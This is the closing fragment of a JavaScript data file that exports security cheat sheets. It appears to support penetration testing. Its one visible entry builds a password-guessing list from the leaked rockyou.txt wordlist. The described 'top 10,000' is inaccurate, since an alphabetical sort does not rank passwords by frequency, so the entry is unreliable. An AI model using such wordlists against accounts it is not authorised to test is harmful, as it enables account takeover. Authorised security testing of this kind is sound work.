        cmd: 'cat /usr/share/wordlists/rockyou.txt | sort -u | head -10000 > top10k.txt',
        desc: 'Extract the top 10,000 unique passwords from rockyou.txt',
      },
    ],
  },

];

module.exports = { CHEAT_SHEETS };
